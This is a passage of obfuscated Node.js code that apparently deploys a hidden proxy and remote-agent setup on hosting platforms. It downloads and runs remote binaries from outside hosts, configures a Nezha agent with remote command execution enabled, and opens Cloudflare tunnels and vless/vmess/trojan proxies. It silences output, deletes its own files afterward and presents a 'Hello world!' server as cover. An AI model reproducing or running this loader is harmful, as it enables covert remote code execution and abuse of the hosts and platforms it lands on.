_0x3fb7c2=_0x1c2f,_0x8766e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x8766e[_0x3fb7c2(0x1c4)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x8766e['push'](phpPath);process[_0x3fb7c2(_0x5ef4dd._0x5b9e18)]===_0x3fb7c2(_0x5ef4dd._0x596ef4)?exec(_0x3fb7c2(_0x5ef4dd._0x44eaac)+_0x8766e['join']('\x20')+'\x20>\x20nul\x202>&1',_0x589a94=>{const _0x4e8a35=_0x3fb7c2;console[_0x4e8a35(0x1fe)](),console[_0x4e8a35(_0x514c00._0x5c60f1)](_0x4e8a35(0x223)),console[_0x4e8a35(_0x514c00._0x336543)](_0x4e8a35(_0x514c00._0x159475));}):exec(_0x3fb7c2(0x1a4)+_0x8766e['join']('\x20')+_0x3fb7c2(0x1ba),_0x11a6ce=>{const _0x559bb4=_0x3fb7c2;console[_0x559bb4(_0xe619dc._0x1722c0)](),console[_0x559bb4(0x1a1)]('App\x20is\x20running'),console[_0x559bb4(_0xe619dc._0x20c82d)](_0x559bb4(_0xe619dc._0x114e76));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x546db9={_0x29eb8d:0x1a1,_0x3ca71c:0x1b6,_0x2e7d7e:0x192,_0x3fab50:0x184},_0x4e3a31=_0x4e47a7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4e3a31(_0x546db9._0x29eb8d)](_0x4e3a31(_0x546db9._0x3ca71c));return;}try{const _0x234b2a=await axios[_0x4e3a31(0x174)](_0x4e3a31(0x1c9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4e3a31(0x213)}});return console[_0x4e3a31(0x1a1)]('automatic\x20access\x20task\x20added\x20successfully'),_0x234b2a;}catch(_0x3ee355){return console[_0x4e3a31(_0x546db9._0x2e7d7e)](_0x4e3a31(_0x546db9._0x3fab50)+_0x3ee355[_0x4e3a31(0x1de)]),null;}}function _0x1c2f(_0x3386ca,_0x18e070){const _0x1e0b36=_0x1e0b();return _0x1c2f=function(_0x1c2f46,_0x5a83dd){_0x1c2f46=_0x1c2f46-0x16f;let _0x1940ad=_0x1e0b36[_0x1c2f46];return _0x1940ad;},_0x1c2f(_0x3386ca,_0x18e070);}async function startserver(){const _0x5ed3f1={_0x425f3e:0x192},_0x2defae=_0x4e47a7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1808be){console[_0x2defae(_0x5ed3f1._0x425f3e)]('Error\x20in\x20startserver:',_0x1808be);}}function _0x1e0b(){const _0x47f992=['Content-Type','&path=%2Fvless-argo%3Fed%3D2560#','amd','firefox','abcdefghijklmnopqrstuvwxyz','Error\x20executing\x20command:\x20','axios','https://arm64.ssss.nyc.mn/agent','util','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20credentials-file:\x20','94095ZTqjwi','join','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20already\x20exists','blackhole','path','forEach','filter','child_process','\x22\x20>\x20/dev/null\x202>&1','Unhandled\x20error\x20in\x20startserver:','--tls','https://amd64.ssss.nyc.mn/agent','./tmp','basename','NEZHA_SERVER','error','251414QUzCWR','\x20-p\x20','/sub.txt\x20saved\x20successfully','ARGO_DOMAIN:','18UcdNYl','has','Hello\x20world!','Unknown','127.0.0.1','ARGO_DOMAIN','2083','Download\x20','config.json','map','log','del\x20/f\x20/q\x20','NEZHA_KEY','rm\x20-rf\x20','toString','php\x20running\x20error:\x20','false','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.json','status','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','412FmHhRT','/config.json\x20>/dev/null\x202>&1\x20&','TunnelSecret','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','tunnel.yml','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','SUB_PATH','\x0a\x0atrojan://','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Skipping\x20adding\x20automatic\x20access\x20task','list.txt','CFPORT','env','\x20>/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','http\x20server\x20is\x20running\x20on\x20port:','7755970tJhtyi','win32','40931748iXvoAE','7kwjZjZ','AUTO_ACCESS','https://amd64.ssss.nyc.mn/v1','createWriteStream','push','test','8443','.exe\x20>\x20nul\x202>&1','PORT','https://oooo.serv00.net/add-url','/api/delete-nodes','&path=%2Ftrojan-argo%3Fed%3D2560#','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','5125734crRuLn','readFileSync','FILE_PATH','NEZHA_PORT','writeFileSync','2087','PROJECT_URL','Empowerment\x20failed\x20for\x20','tls','org','country_code','arm','stringify','get','floor','pipe','then','message','2096','stream','data','http','\x20failed:\x20','Northflank','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','includes','charAt','isFile','nohup\x20','block','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web','3RJVKAk','https://amd64.ssss.nyc.mn/bot','countryCode','666','NAME','base64','boot.log','northflank.karlxu.qzz.io','text/plain;\x20charset=utf-8','utf-8','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','443','unlink','true','3038628CCmAAD','Subscription\x20uploaded\x20successfully','pkill\x20-f\x20\x22[','clear','\x20is\x20created','SERVER_PORT','tcp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://ipapi.co/json/','close','vless','trojan','length','\x0aclient_secret:\x20','random','response','xtls-rprx-vision','sub.txt','none','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','pop','match','10313288yFUAHF','all','application/json','npm\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/web','UUID','listen','from','2053','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','freedom','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','config.yaml','\x0a\x0avmess://','&fp=firefox&type=ws&host=','/vless-argo','direct','\x20-s\x20','App\x20is\x20running','?encryption=none&security=tls&sni=','/vmess-argo','substring','split','https+local://8.8.8.8/dns-query','taskkill\x20/f\x20/im\x20','platform','https://arm64.ssss.nyc.mn/v1','Error\x20downloading\x20files:','unshift','vmess','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','chmod','catch','statSync','/tunnel.yml\x20run','existsSync','quic','\x20successfully','/dev/null','cdns.doon.eu.org','post','\x20is\x20running','?security=tls&sni='];_0x1e0b=function(){return _0x47f992;};return _0x1e0b();}startserver()[_0x4e47a7(0x231)](_0x172c92=>{const _0x422c17={_0x2de8fb:0x192},_0x323e31=_0x4e47a7;console[_0x323e31(_0x422c17._0x2de8fb)](_0x323e31(0x18c),_0x172c92);}),app[_0x4e47a7(0x217)](PORT,()=>console[_0x4e47a7(0x1a1)](_0x4e47a7(0x1bc)+PORT+'!'));
